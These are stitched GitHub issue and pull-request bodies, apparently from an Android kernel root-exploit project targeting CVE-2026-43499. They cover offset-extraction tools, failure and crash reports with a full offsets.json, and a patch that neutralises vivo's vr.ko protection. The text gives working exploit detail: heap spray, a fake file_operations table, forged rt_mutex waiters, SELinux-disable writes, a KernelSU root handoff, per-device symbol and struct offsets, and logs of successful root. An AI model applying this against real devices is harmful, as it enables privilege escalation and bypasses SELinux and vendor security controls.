
### 6. 未验证与已知限制（请按此评估）

- **没有逐项门禁记录**：没有 `tools/cmp_disasm.py` 对比、冷机、固定 CPU 对、KernelSU 未加载的干净启动，
  因此本次**不能**据此标 supported。
- **本修订之后的改动没有真机检验**，本 PR 不含它们。
- 曾在**另一份未发布构建**上观察到 W2 重试 15 次全败；那次日志没有留存，所以既未定位、也不声称已修。
- 根目录的 `PR.md` / `PR_CHECKLIST.sh` / `IMPLEMENTATION_COMPLETE.patch` / `EXTRACT_TRACEPOINT_CONSTANTS.md`
  是工作笔记，如不需要可在合并前删掉。

关联：该方向源自 #241（同作者，方案已并入本 PR 的实现方式）。

items.title: tools(extract_rs): add btf_field and symbols_grep examples
items.body:
Two small read-only example tools for `tools/extract_rs`, both of which came out of porting this exploit to a MediaTek device and both of which I would have wanted on day one.

## Why

Every port of this exploit is a search for two kinds of numbers, and neither is discoverable with the tools currently in the tree:

1. **Struct field offsets.** Forks carry a `target.h` copied from whichever device the fork was made for, and `devices/<name>/offsets.h` usually overrides *symbol* offsets only, not *field* offsets. Using a 6.12 `target.h` on a 6.1 kernel silently shifts `file_operations`, `cred` and `rt_mutex_waiter`, and the result is a kernel panic rather than an error message. BTF is generated after `randstruct` runs, so it is the only correct source for `__randomize_layout` structs such as `selinux_state` — and it is embedded in the device's own `boot.img`, so no root and no device are needed to read it.

2. **Symbols a fork marked "absent".** An offset of `0` is used as a "technique unavailable" marker, and code often gates whole stages on it. When such a symbol actually exists on the target kernel, the gate silently disables a working code path with no error. Grepping the recovered kallsyms table for a substring is the quickest way to tell "absent" apart from "not filled in".

Both tools read only `boot.img`.

## `examples/btf_field.rs`

```
usage: btf_field <boot.img> <struct> [field...]
```

```
$ btf_field boot.img selinux_state selinux_state.enforcing selinux_state.initialized selinux_state.checkreqprot
BTF loaded: 5658967 bytes

struct selinux_state size = Some(136)
selinux_state.enforcing = 0 (0x0)
selinux_state.initialized = 2 (0x2)
selinux_state.checkreqprot = 1 (0x1)
```

`selinux_state` is `__randomize_layout`, so the ordering of `enforcing` / `checkreqprot` / `initialized` cannot be read off a header and differs between kernels; here the disable write has to clear byte 0 while leaving byte 2 non-zero, or `security_sid_to_context_core` starts reporting "called before initial load_policy" and the framework dies.

```
$ btf_field boot.img file_operations file_operations.write_iter file_operations.open file_operations.release
BTF loaded: 5658967 bytes

struct file_operations size = Some(272)
file_operations.write_iter = 40 (0x28)
file_operations.open = 112 (0x70)
file_operations.release = 128 (0x80)
```

That is the one that matters for the fops redirect: on 6.1 `write_iter` is `0x28` and `open`/`release` are `0x70`/`0x80`, not the `0x30`/`0x68`/`0x78` a 6.12 `target.h` would have you write into the fake table.

```
$ btf_field boot.img rt_mutex_waiter rt_mutex_waiter.task rt_mutex_waiter.lock rt_mutex_waiter.wake_state
BTF loaded: 5658967 bytes

struct rt_mutex_waiter size = Some(88)
rt_mutex_waiter.task = 48 (0x30)
rt_mutex_waiter.lock = 56 (0x38)
rt_mutex_waiter.wake_state = 64 (0x40)
```

Worth noting that the reported size (88, i.e. `0x58`) is the check that catches the most common porting bug: an offset equal to the struct size means the forged waiter writes past its own object.

## `examples/symbols_grep.rs`

```
usage: symbols_grep <boot.img> <substring> [limit]
```

```
$ symbols_grep boot.img ashmem 32
info: kallsyms layout pre-6.4 recovered (102601 symbols)
_text base offset = 0xffffffc008000000
30 match(es) for "ashmem" (showing 32)
  +0x397328  memfd_ashmem_shim_ioctl
  +0x39773c  memfd_ashmem_shim_compat_ioctl
  +0xc3bd88  is_ashmem_file
  +0xc3bda4  ashmem_llseek
  +0xc3be4c  ashmem_read_iter
  +0xc3bf0c  ashmem_ioctl
  +0xc3c844  compat_ashmem_ioctl
  +0xc3c89c  ashmem_mmap
  +0xc3cabc  ashmem_open
  +0xc3cb44  ashmem_release
  +0xc3cc64  ashmem_show_fdinfo
  ...
  +0x1282910  ashmem_fops
  ...
  +0x217cad0  ashmem_mutex
  +0x217cb00  ashmem_shrinker
  +0x217cb40  ashmem_shrink_wait
  +0x217cb60  ashmem_lru_list
  +0x217cb70  ashmem_miscs
  +0x2287688  ashmem_shrink_inflight
  +0x2287698  ashmem_mmap.vmfile_fops
```

`ashmem_miscs` is the case in point. `ashmem_misc_fops` is absent from some OEM kallsyms, so a fork leaves that offset `0` — and on one device that `0` silently skipped the entire `try_cfi_stage()` -> `leak_kernel_base()` -> `install_child_root()` chain, i.e. a working root implementation that never executed. `symbols_grep` finds the neighbouring `ashmem_miscs`, from which the address of the `fops` pointer inside the miscdevice is `+0x10`.

## Scope

- Both are `examples/`, i.e. dev-only binaries. No change to the extractor CLI, the native attack runtime, or any profile.
- Both use APIs already exported by `src/lib.rs` (`BootImage::embedded_btf`, `Btf::field/size`, `kallsyms_finder::recover`, `kallsyms::unique`, `derive::relative_symbols`) — no new public surface.
- Verified with `cargo build --release --example btf_field --example symbols_grep` and `cargo fmt -- --check` on current `main`. All outputs above are verbatim from a real `boot.img` (Infinix X6879, MT6788, `6.1.157-android14-11-ga8b0b542991e-ab15601211`).

items.title: [4.19 vendor kernel] KernelSnitch mm_struct leak never succeeds - kernel_major schema has no 4.x path (SM8250 / vivo Pad DPD2106)
items.body:
### Summary

On a **vendor 4.19.152** kernel (Qualcomm SM8250) the KernelSnitch `mm_struct` leak **never** succeeds. Because no known heap address is obtained, `prepare_good_kernel_page()` returns 0 and the exploit aborts at the very first write with `heap spray failed`. The profile schema only accepts `kernel_major` values `5`/`6`, so this 4.x device is forced down the 6.x code path with `kernelsnitch-6x.conf` presets.

Related: #206 (vr.ko bypass on vivo) — that part appears to work in build 551; this report is about the 4.x leak path.

### Device

| | |
|---|---|
| Model | vivo Pad (2022), **PA2170** / product **DPD2106** |
| SoC | SM8250 (Snapdragon 870, kona) |
| OS | Android 14 (SDK 34), OriginOS HD 14.0, build `DPD2106_A_8.7.30` |
| Bootloader | **locked**, SELinux **Enforcing**, shell uid 2000 |
| Kernel | `Linux version 4.19.152-perf+ (compiler@comdg01150030) (clang version 10.0.5 for Android NDK, GNU ld 2.27.0.20170315) #1 SMP PREEMPT Thu Apr 9 17:09:41 CST 2026` |
| cmdline | `kpti=off androidboot.dpcfg=sm8250 androidboot.securebootkey=qcom_tablet bootdevice=1d84000.ufshc` |
| App | GhostLock v1.2, **versionCode 551** (pre-release) |

### Observed behaviour

1. **TCP zerocopy route fails outright** — 2000/2000 attempts `ret=-1 errno=22 len=64 calls=0 success=0`; the app falls back to Select Stack, as the profile prescribes.
2. **Leak stage fails** — `KernelSnitch mm_struct leak failed`, with `leak_failed=12 leak_ok=0 root_lines=0`.
3. **Every write aborts** — `heap spray failed`.
4. `sched_setaffinity` EINVAL spam for the profile's recommended cores 4/5 (`profile cores 4/5 not in allowed cpuset`). Using `main=0 consumer=1` removes it entirely (EINVAL count 0).
5. One run ended in a **PMIC hard reset**: `ro.boot.bootreason = HARD+CBL/PS_HOLD/NONE` (kernel hang).

### Source-level cause

`src/core/session/backend/cve_2026_43499_backend.cpp`, `attack_write()`:

```cpp
attack::timer_mark("  heap spray start");
(session.heap.current.base) = support::prepare_good_kernel_page(request);
if (!(session.heap.current.base)) {
    pr_warning("  heap spray failed\n");
    return 0;
}
```

The payload page can only be built from an address produced by the KernelSnitch `mm_struct` leak. That leak never succeeds here, so every later stage is unreachable. The failure is upstream of boot.img / OTA / route selection.

### Measurements from the device's own kernel tree + config

Record-layout probe against the vendor kona tree (`Linux 4.19.125` sources, device `include/generated/autoconf.h`), clang 10 (NDK r26d), `-target aarch64-linux-gnu -D__KERNEL__ -DCONFIG_ARM64`:

| Quantity | Value |
|---|---|
| `sizeof(struct mm_struct)` | **0x380 = 896** |
| `mm_cachep` flags (`kernel/fork.c`) | `SLAB_HWCACHE_ALIGN \| SLAB_PANIC \| SLAB_ACCOUNT` |
| resulting object size | **896** (already 64 B aligned) |
| derived `mm_slab_order` | **3** (`min_objects = 4*(fls(nr_cpu_ids)+1) = 20`; `896*20 = 17920 B` → order 3 = 32768 B) |
| `possible` CPUs / online | **0-7 (8)** / 7 |
| `MemTotal` | 7,785,772 kB |

Setting `kernelsnitch.mm_struct_sz` to **896** changes nothing versus the original **1024** — identical failure counts. `mm_slab_order` is not exposed in the profile, so it cannot be tested from the outside.

### Ruled out: futex hash table size

`futex_hash_table_size_for()` computes `cpu_count * 256` (the 5.13+ dynamic scheme). This vendor tree **backported the dynamic table into 4.19**:

```
kernel/futex.c:3986   futex_hashsize = 16;                                   /* CONFIG_BASE_SMALL */
kernel/futex.c:3988   futex_hashsize = roundup_pow_of_two(256 * num_possible_cpus());
CONFIG_BASE_SMALL = 0
```

With 8 possible CPUs this yields 2048 — matching the app exactly. **Not the bug.**

### Relevant kernel config

`VA_BITS=39`, 4K pages, `PREEMPT=y`, `RT_MUTEXES=y`, `FUTEX_PI=y`, `CONFIG_DEBUG_RT_MUTEXES` **unset** (compact waiter), no BTF, no CFI, `KALLSYMS_ALL=y`, `KALLSYMS_BASE_RELATIVE=y`, `RANDOMIZE_BASE=y`, `SLUB=y`, `SLAB_FREELIST_HARDENED=y`, `SLAB_ACCOUNT`, `SELINUX=y`, `STATIC_USERMODEHELPER_PATH="/system/bin/vivo_coredump"`.

### Questions

1. Is a 4.x vendor kernel (with the 5.13 futex backport) intended to be supportable, or is `kernel_major in {5,6}` a hard boundary?
2. If supportable, what does the `mm_struct` leak depend on that differs on 4.19 — the per-memcg `SLAB_ACCOUNT` cache behind `mm_cachep`, the scan bounds, or `mm_objs_per_slab`?
3. I can run any instrumented build and return full logs. adb is available in system mode; the bootloader stays locked.

### 中文摘要

vivo Pad（PA2170 / DPD2106，SM8250，Android 14）内核为 **厂商 4.19.152**。GhostLock v1.2(551) 的 vivo `vr.ko` 绕过正常，但 **KernelSnitch 的 `mm_struct` 泄露在此内核上永远失败**，导致 `prepare_good_kernel_page()` 返回 0、所有写入在第一步就以 `heap spray failed` 中止。profile schema 的 `kernel_major` 只接受 5/6，4.x 设备被强制走 6.x 路径。已排除 futex 哈希表大小（该厂商把 5.13 的动态表回移进了 4.19，2048 与 app 计算一致）。`mm_struct_sz` 试过 1024 与实测值 896，均无变化。实测 `mm_struct` = 896 字节、slab order 3、`SLAB_HWCACHE_ALIGN|SLAB_ACCOUNT`。TCP zerocopy 路线 2000 次全 `errno=22`；建议 CPU 4/5 不在允许 cpuset 内，改用 0/1 后 EINVAL 归零。有一次运行以 PS_HOLD 硬复位结束。

同 SoC（MT6989）同症状，补充一份完整数据：iQOO Neo9 Pro（V2339FA），固件 `PD2339_A_16.2.12.1.W10.V000L1`，内核 `6.1.145-android14-11-maybe-dirty`，BL 锁定。同样是导入 OTA 显示支持、执行即 panic 重启。

## 偏移表来源（已排除镜像问题）

从该固件官方完整 OTA 里流式抽出 boot.img 提取。boot.img 内嵌版本横幅与手机 `/proc/version` **逐字符一致**（含 clang 构建哈希 `d9f89f4d…`），可确认就是正在运行的内核。CVE primitive 存在（`remove_waiter@0x10a15b0` 仍用 current）。

使用的 offsets.json（PR #111 规范，`kernel_phys_load` 留空走运行时推导，`shift` 取启发值 1）：

```json
{
  "release": "6.1.145-android14-11-maybe-dirty",
  "compact_waiter": 1,
  "mm_struct_sz": 1024,
  "pselect_waiter_shift": 1,
  "kernel_phys_load": null,
  "symbols": { "off_init_task": 34667328, "off_init_cred": 34743344,
    "off_selinux_enforcing": 38269592, "off_slide_loggers_0_1": 34614832,
    "off_slide_nfulnl_logger": 34615008, "off_slide_boot_id": 38406288,
    "off_root_task_group": 37005120, "off_selinux_blob_sizes": 23278528,
    "off_security_hook_heads": 23276720 },
  "struct_fields": { "task_prio": 132, "task_cred": 2104, "task_pi_lock": 2340,
    "task_seccomp": 2304, "waiter_task": 48, "waiter_lock": 56,
    "waiter_wake_state": 64 }
}
```

task_* 与 `STRUCT_OFFSETS_6_1` 逐项吻合（BTF 实测），喷洒链每次都成功（kernelsnitch 碰撞命中、mm_struct 泄漏、payload 就绪）。

## 崩溃（5 次，签名完全相同）

```
Unable to handle kernel NULL pointer dereference at virtual address 0x0
pc : _raw_spin_trylock+0x1c/0xa4
lr : rt_mutex_adjust_prio_chain+0x130/0x91c
     __sched_setscheduler ← __arm64_sys_sched_setattr (consumer 线程)
```

即 PI walk 读到的 stale waiter 的 `->lock` 为 0，投毒内容没落位。已排除的变量：`kernel_phys_load` 三态（0x0800000 / 0x80000000 / 留空推导）× TCP/pselect 双路线 × App/adb 双环境 × 大核/小核 —— 签名分毫不变，说明与 phys 无关。

## 反汇编级验证（用的就是这个 boot.img）

1. **pselect 路线几何无解**：推导链 `__arm64_sys_pselect6→core_sys_select`（2 帧，本内核无 `do_pselect` 符号，被 LTO 内联了），`futex_wait_requeue_pi` 的 rt_waiter 经 `rt_mutex_wait_proxy_lock` 传参交叉验证确认在 `sp+0x28`。归一化得 `delta=-216`（waiter 槽在 fd_set 拷贝下方 216 字节），任何 shift 都够不着。注：`/proc/version` 显示该内核是 `+pgo,+bolt,+lto` 构建，栈帧布局与 GKI 参考构建不同可能是根源。
2. **TCP 路线几何精确命中**：getsockopt 全链 6 帧 `[0x10+0x60+0x10+0xf0+0x10+0x190]=0x310`（含 `sk_getsockopt` 0xf0 和 `tcp_getsockopt` 0x10），zc 结构体在 `do_tcp_getsockopt` 的 `sp+0x40`（由 `tcp_zerocopy_receive(sk, sp+0x40, sp+0x10)` 调用点确认），归一化 `-720` 恰等于 waiter 槽 `-728` 加 8，即 `zc[0x28]/zc[0x30]` 正对 `waiter->task/lock`；且 `tcp_zerocopy_receive` 内无任何对 `+0x28/+0x30` 的写操作，用户填的值会被保留。但运行时 walk 依然读到 NULL。

结论：pselect 在此内核上静态即不可行；TCP 几何正确但投毒仍未落位，剩余嫌疑为 `pi_blocked_on` 悬挂目标或竞争态细节，需改 exploit 源码才能继续。offsets.json 和现场日志可提供，需要的话我可以贴完整 ramoops。

   「重复投毒 + 重复 walk」，是这台设备能跑完一轮的前提（否则 vr.ko 行为无法真机验证）。
   改动自包含，可拆 —— 如需要，我保留 vr.ko 部分、把重复投毒另开一篇。
2. **与 main 新约定是否现在对齐**（`2d9d8016` 的「整域 + 显式 null」规则、`a9518142` 的
   `kernel_phys_offset`）：本 PR 按目标分支既有的 presence 语义实现；若要现在对齐，属机械改动，
   我可以直接做进本篇。
3. **两处 API/类型选择**：`AncillaryContext.write_zero`（语义化「清零一个字」，避免行为引用
   middleware 的 `WriteRequest`；也可以改成更通用的 `write` 形态）；`vr_guard.tracepoint_funcs`
   用 `u8` 标量（0 = 未提供，与 `offset.*` 惯例一致；改成 presence 语义需要更多字节、会超出
   padding，得重评布局冻结）。

其余内容：逐文件改动（§主要变化）、验证矩阵与反汇编核对、两份真机门禁、明确保留 —— 见下文。

本 PR 实现 `docs/analysis/ancillary-controller-guide.md` §9 留下的任务：`VrGuardPolicy`
（vivo/iQOO `vr.ko` 探针中和），并让测试设备能真正跑完一轮以做真机验证。完整计划与证据
（含逐函数反汇编核对记录、真机门禁）在 `docs/analysis/vr-guard-plan.md`。

## 概览

1. **行为**（guide §4–§6）：`PreSpawn` 清 `__tracepoint_sys_exit.funcs`，一次写入覆盖
   本轮全部进程，含 ksud 与它派生的 shell。
2. **profile 契约**：gate（`meta.vr_guard`）+ 符号（`offset.vr_sys_exit_tp`）+ 布局
   （`vr_guard.tracepoint_funcs`，由镜像自身 BTF 推导）；native / `profile-core` / 提取器
   三侧同步。不改 wire 版本，既有 profile 字节不变（冻结 golden 未重算）。
3. **multicast route**：单次投毒 → 重复投毒 / 重复 walk。本机跑通的前提，见下节。

问题背景（#154 / #201 / #61）：临时 root 成功后，vr.ko 在 `commit_creds` 上给 uid 0 进程
打 tag，在 `__tracepoint_sys_exit` 上按 tag 杀进程——ksud 与它 fork 的 shell 连锁死亡
（管理器白屏、应用黑屏、系统不稳定直到重启）。现有的逐任务清 tag 只覆盖 exploit 子进程。
清 `funcs` 后，tracepoint 迭代器见 `funcs == NULL` 跳过全部探针；打 tag 的探针照常运行，
但无人响应。

## 主要变化

| 领域 | 文件 | 变更 |
|---|---|---|
| 行为（纯函数，host 可编译） | `src/core/session/ancillary/vr_guard.hpp` | `plan_vr_guard()`：profile → `{image_offset, width_bytes}`，缺符号或布局任一事实返回 `nullopt`（fail closed）；`enabled()` 只做 profile gate |
| 行为（设备） | `src/core/session/ancillary/vr_guard.cpp` | 运行时 `/proc/modules` 确认 vr.ko（guide §5，不按 `uname -r`）；≤5 次尝试写 `sys_exit tp->funcs`；失败只告警 |
| 原语注入 | `src/core/session/ancillary/ancillary_policy.hpp` | `AncillaryContext` 增加 `AncillaryZeroFn write_zero`（plain 函数指针，无虚分派） |
| 调用点 | `src/core/session/backend/cve_2026_43499_backend.{hpp,cpp}` | `w1()` 末尾固定 `PreSpawn` 调用点；`zero_word<M>()` 适配器绑定 session 全局（见设计点 2） |
| profile 模型 / wire | `src/core/profile/{model.h,binary.cpp}` | gate / 符号 / 布局与 multicast 调参；新字段全部落既有 padding，`sizeof`/`offsetof` 不变 |
| 读取点 | `src/core/attack/ops.cpp`、`src/core/route/multicast_waiter_route.cpp` | 调参经 `mcast_tuning()` 读取 |
| multicast route | `src/core/route/multicast_waiter_route.cpp` | 重复投毒 / 重复 walk；`attempts/arm_sequence/arm_hold` 默认 128/16/20000，profile 可覆盖，0 保持默认 |
| 提取器 | `tools/extract_rs/src/{symbols,report}.rs` | `__tracepoint_sys_exit`（optional）；`struct tracepoint.funcs` 由 BTF 取；`--format conf` 输出三项 |
| profile-core / app | `NativeProfile.kt`、`ProfileResolver.kt`、`MulticastConfig.kt`、编辑器（`AndroidProfileConfigController`/`FieldLabels`）、往返测试、内置 profile + `index.conf` | 三字段读写与白名单；multicast `attempts/arm_sequence/arm_hold` 的 Kotlin 镜像补齐（原先只存在于 native 字段表），并收录进编辑器（换路由时作为占位播种、补标签）与范围校验（8/8/16 位，越界上报而不是被类型转换绕回）；新增 iQOO 12（`6.1.145-android14-11-maybe-dirty`）内置条目 |
| 修复 1 | `profile-core/.../ProfileMerger.kt` | 合并基准改为深拷贝共享 execution 预设（见下节） |
| 修复 2 | `app/src/test/resources/remote-main-6x-offsets.json`、`ProfileMigrationEquivalenceTest.kt` | 新内置进入 remote/main 迁移夹具（实测值、嵌套 `route` 声明）；夹具尺寸断言 52 → 53 |
| 主机测试 | `src/core/tests/ancillary_test.cpp` | gate 开/关、fail-closed plan、目标算术 |
| 计划 / 证据 | `docs/analysis/vr-guard-plan.md` | 计划、反汇编核对记录、真机门禁 |

## 对评审的回应（全部已修复）

| 评审意见 | 处理 |
|---|---|
| 路由把 `setsockopt` 返回 0 当作成功，缺少 consumer 的验证写入 | `ROUTE_OK` 现在只由 `consumer_success > 0` 决定（与 select 路由一致）；日志补 `sockopt=` 字段 |
| `vr_tracepoint_funcs` 为 u8，BTF 偏移 ≥ 0x100 会被静默截断（fail-closed 失效） | 提取器仅在 `1..=0xFF` 时输出布局，否则整段省略、guard 保持关闭；共享校验同时拒绝超宽的 `vr_guard.tracepoint_funcs` |
| 调参三键的窄化转换先于共享校验，导出器等非 App 调用方会静默回绕 | `ProfileResolver.validateMerged` 增加 8/8/16 位宽度校验（route 与 fallback 两支），带测试 |
| 硬编码 (4,5) 会成为所有具备 4/5 核心设备的默认核对 | 改为**按 profile 推荐**（`BuiltinProfileCatalog` + `UserProfileStore`，与 `recommend_shizuku` 同一机制），用户显式选择优先 |
| 非 conf 格式在缺 `tracepoint.funcs` 时整体解析失败 | `OPTIONAL_STRUCT_FIELDS` 增加 `vr_tracepoint_funcs`，JSON/text 输出保持可用 |

修正后已在真机上复跑门禁：冷启动 / 锁屏 / multicast、**第一次尝试通过**
（`ANC-02`：`child is root!` → `KernelSU ready`，`su` = root；新判据在日志中可见 ——
`sockopt=-1` 而 `success=1`，`status=0` 单独由 consumer 的验证写入支撑）。

另附一个针对性验证：为排除"更诚实的判据 → 调用方重试增多 → 拉低成功率"的疑虑，做了**配对
实验**（修复前/后二进制在同一时间窗内交替各 10 轮，条件相同）：两者均 **2/10 通过**，不一致对
2（1:1），精确检验 **p = 1.00** —— 判据修正不改变成功率。对照中发现该指标对**设备疲劳**极
敏感（同条件、同一枚二进制：下午 70%、晚间 20%），因此跨时段的成功率比较不可用，须同窗配
对。

## 新内置条目附带的两项修复

新内置条目把两个既有缺陷变成可见失败，随本 PR 一并修复：

1. **导出器合并状态泄漏**（`ProfileMerger.resolveMerged`）：合并基准曾直接引用共享的
   `execution` 预设实例，而 `deepMergeValues` 原地写入 —— 首个覆盖 execution 值的内置
   （本 profile 的 `heap.prepare_max_attempts = 12`）把它写进共享预设，导出器在同一进程
   合并全部内置，其后的 profile 因此全部继承 12，直到某个 profile 显式写回 4。
   `ExporterAgreementTest` 在 9 个 profile 上复现。修复为种子前深拷贝该预设。
   该缺陷此前不可见：没有任何内置把 execution 值改成非默认。
2. **迁移夹具缺口**（`ProfileMigrationEquivalenceTest`）：该测试要求 remote/main 夹具覆盖
   每个现行 6.x 内置。remote/main 时代没有 multicast 路由，新条目以嵌套 `route` 对象声明
   （转换器对该形态原样透传），迁移解析结果与内置文档逐字节一致。

## 参考的方案与同期工作

实现依据：

- 本分支自己的设计文档 `docs/analysis/ancillary-controller-guide.md` §4–§9（behavior contract、
  stage、运行时适用性、profile 契约）与分支上的 `VrGuardPolicy` 骨架；
- 分支内既有的 **per-task 清 tag**（`cve_2026_43499_backend.cpp` 的 w2b 路径，`VR_TAG_B_OFF`，
  注释注明 ported from root.c）—— 它只覆盖 exploit 子进程；本 PR 补的是 root 之后 ksud 与
  它派生的 shell 的存活（#154/#201/#61）；
- 设备侧对 vivo `vr.ko` 的确认：`commit_creds` 上给 uid 0 打 tag、`__tracepoint_sys_exit` 上
  执行；
- 内核侧依据：tracepoint 迭代器在 `funcs == NULL` 时跳过全部探针
  （`for (func = tp->funcs; func && func->func; func++)`），因此清空是安全的全局中和；
- 参考套件 `zhubaohe123/ghostlock-kit` 在同内核线上的实测参数与流程（multicast 几何、
  重复投毒 128/16/20000、CPU 4/5、iomem 缓存、锁屏低噪声窗口）；
- 布局不按内核版本查表，而由**镜像自身 BTF** 推导（guide §5/§6 的要求）。

提交前核对了上游同期/历史同类工作（**本 PR 未使用其代码**）：

| 编号 | 作者 | 状态 | 做法 | 与本 PR 的差别 |
|---|---|---|---|---|
| #141 | abdulla-li | closed（未合并） | 旧 C 架构的 vr.ko 全局中和 | 架构已迁移；思路相同，本 PR 按新架构重做 |
| #220 / #221 | abdulla-li | #220 closed；#221 open（base 为 `main`） | 在 `main` 的 w2b 块里清 `funcs`；布局用 `target.h` 里**按版本硬编码的常量**（6.1=0x40 / 6.6=0x48），符号只加进一个内置 profile | 本 PR 在 `vr-ko-bypass-dev` 的 ancillary 架构内实现（guide 契约、`PreSpawn` 固定调用点、profile gate + fail-closed）；布局由**镜像 BTF** 推导、提取器对所有镜像产出；结构体只用既有 padding 以保持 `cmp_disasm` 冻结；并带真机门禁 PASS（见上） |
| #201 / #206 | issues | open | 需求 / 问题报告 | 本 PR 提供实现 |

## 关键设计点

1. **布局冻结**：攻击函数按偏移读写 session 成员，`cmp_disasm` 要求其机器码不变，所以新
   字段一律放进既有 padding（`kernel_offsets` 尾部 4 字节、`KernelMisc` 的 2+4 字节）。
   主机探针在基线与本分支逐项核对：`sizeof(kernel_offsets)=448`、`sizeof(TargetProfile)=712`、
   `misc@248 / geometry@288 / execution@328` 一致。
2. **LTO 常量折叠**：适配器最初把 session 参数经函数指针转发，LTO 无法再证明其恒为常量，
   `attack_write` 寄存器分配变化（126 → 130 条指令）。改为适配器内部引用 `g_exploit_session`
   后恢复 IDENTICAL (strict, 126)。
3. **不按内核版本推断**：`funcs` 偏移 6.1 为 `0x40`、6.6 因插入 `probestub` 为 `0x48`；
   写错只会静默改到 `unregfunc`。因此由镜像自身 BTF 取（guide §5/§6），同一份代码覆盖两代。
4. **失败不致命**：无 BTF / 无符号 / 无 vr.ko 的机器上行为保持关闭；写入失败只告警，不改变
   主流程返回码。

## 验证

| 项 | 命令 | 结果 |
|---|---|---|
| 主机测试 | `make -C src native-host-tests` | **25/25 PASS**；`tcp_zerocopy_route_test` 因 AArch64 `yield` 汇编在 x86 主机上不可构建，`deff0b1b` 基线上同样失败，非本 PR 引入 |
| NDK 构建 | `make -C src ghostlock`（ONDK r30.1） | 0 告警（二进制 md5 `02f2be01`） |
| lint | `make -C src lint-tidy` | rc=0，用户代码 0 findings |
| 反汇编核对 | `tools/cmp_disasm.py <baseline> build/native/ghostlock` | 见下 |
| Rust | `cargo test --release`（extract_rs） | 34/34；`--format conf` 对本机 boot.img 复核输出 `vr_sys_exit_tp=37532032`、`tracepoint_funcs=64` |
| Kotlin | `./gradlew :profile-core:test :app:testDebugUnitTest` | 全绿：**80 app 测试 + 17 profile-core**（含新增 vr.ko 往返夹具、multicast 调参键向量，及上节两处修复的回归） |
| 真机门禁 | 冷启动、锁屏、multicast、`main=4 consumer=5` | **PASS**：2026-09-30（旧二进制）、2026-10-02 两次 —— 其中一次为**评审修正后的二进制**（`ANC-02`，首次尝试即通过）；归档 `docs/analysis/device-gates/ANC-0{1,2}-*.md` |

反汇编核对（基线 `deff0b1b` 干净构建，md5 `27879fa7`；候选本分支，md5 `02f2be01`；工具为
本分支自带的 `tools/cmp_disasm.py`，另用 `origin/main` 的两级版本交叉核对）：

- `owner_thread`、`do_one_write`（3 个 middleware 实例）：**IDENTICAL (strict)**。
- `waiter_thread` / `consumer_thread` / `run_main_route_threads`：5 个未改行为的攻击函数合计
  **102 条**差异指令，逐条按 `adrp` 页基址 + 立即数解析并折算为符号+偏移后，**全部是同一
  对象成员或同一字符串字面量，0 例指向不同目标**（1 条手工解析至 `g_exploit_session+0x5d0`）。
  结构体大小与偏移未动，见设计点 1。
- `do_kernel5_fake_lock_route`：174 → **224** 条，**既定行为改动**（multicast 重复投毒循环包裹
  既有 poison+walk 主体；主体内语句顺序与 prepare/recycle 顺序不变。224 = 评审修正后的条数，
  见下节）。
- `multicast_owner_worker` / `multicast_waiter_worker`：两侧都不存在（本分支未实例化这两个
  worker，与 `kernel-phys-offset-plan.md` 的同类记录一致）。

真机门禁日志（2026-10-02，最终二进制；冷启动、锁屏未解锁、运行起步 `boot_ms≈79s`）：

```
[*] cpu pair: main=4 consumer=5
[*] === W1: SELinux === target=0xffffff802a558f40 mode=1 leaf=0
[*] multicast route status=0 clean=1/1 step=0 errno=0 attempts=16 calls=1 success=1
[+] SELinux permissive
[*] [T+11100ms] Write 1 complete
[*] vr guard: neutralizing __tracepoint_sys_exit.funcs image=ffffffc0823cb1c0 target=ffffff802a3cb1c0 width=8
[+] vr guard: sys_exit probe disabled (attempt 1)
[*] child uid = 0
[+] child is root!
[*] handoff: root shell worker pid=10055
[*] enforce=1 (enforcing)
[+] KernelSU ready
```

设备侧根脚本日志：`late-load kmi=android14-6.1`、`late-load exit=0`、`[+] KernelSU module loaded`。

`su -c id` → `uid=0(root) context=u:r:ksu:s0`（连续 3 次 `id -u` = 0）；
`grep kernelsu /proc/modules` → `Live`；设备未 panic、SELinux 回到 Enforcing（2026-09-30
的旧二进制门禁结论一致）。

关于成功率（如实）：本次 9 次完整尝试 1 次通过，失败全部发生在 route 阶段的内核 panic
（multicast 单次未命中，属 AGENTS.md 的 `KERNEL-PANIC-01` 类环境/时序问题，不归因代码；
失败与通过同等记录在归档里）。另外观察到本机开机后 ≈60–90s 的低噪声窗口（参考套件 README
的经验）明显优于 `uptime ≥ 240s` 窗口，后者 6/6 失败。

## 为什么 multicast 提交在同一个 PR

`7bbaab08` 把 multicast route 从「每阶段一次 poison/walk」改为「重复投毒 + 重复 walk」。它
不是 guide 的任务，但没有它，本机在 W1 就是单张彩票：miss 通常直接 panic，vr.ko 行为无法
在真机上验证。改动自包含（计数来自 profile，既有 profile 不受影响），如果需要，我可以
rebase 掉它另开 PR。

## reviewer 注意（可调整项）

见开头的「需要你拍板的三件事」；与主线新约定对齐的细节：本 PR 已把三个调参键收录进编辑器与
校验（见改动表），其余按目标分支既有的 presence 语义实现（缺值不写键）。合并到含
`2d9d8016` 规则的主线时，把 `vr_guard.tracepoint_funcs` 与
`route.multicast_waiter.{attempts,arm_sequence,arm_hold}` 纳入提取器/编辑器的 field universe
（缺值写显式 null）即可。

## 风险与未验证

- 6.6 内核的 `funcs=0x48` 路径只有 BTF 推导，无该内核设备实测。
- BTF / 符号缺失的镜像：提取器不输出对应字段，行为保持关闭（fail closed）。
- 门禁环境注记：运行机当前未安装 KernelSU 管理器，handoff 的 ksud 取自参考套件
  `files/ksud`（`ksud 3.3.0 (uapi: 2)`，与官方管理器 32601 同版），与套件 README 的手动步骤同一
  路径；不涉及本 PR 的代码路径。另：本机 `/data/local/tmp` 开机即清空，验证时文件在 boot 后重新
  推送；`.ghostlock_iomem` 用本机实测存档播种（native 在无缓存时按内置几何继续，行为等价于
  更宽的界，缓存只会收窄它）。

## 明确保留

- 不动 `kernelsnitch/`、v1 转换路径（`LegacyProfileConverter.kt`）与保留清单。
- 不改 wire 版本；既有 profile 字节不变。
- 不修改 `tools/cmp_disasm.py`。

items.title: Add 6.6.30-android15-8-g8eff17a54aa9 XRing O1 (violin) kernel offsets
items.body:
## Device / kernel

- Xiaomi Pad 7S Pro (`violin`, 25053RP5CC), XRing O1
- Kernel: `6.6.30-android15-8-g8eff17a54aa9-abogki407711482-4k` (OTA OS2.0.203.0.VOTCNXM) — the HyperOS 2 line still running on many violin units (sibling of #95's 6.6.77-g5770c661275f from the HyperOS 3 line)
- boot.img recovered from the official full OTA via payload.bin Range-partial download; raw kernel, banner-verified
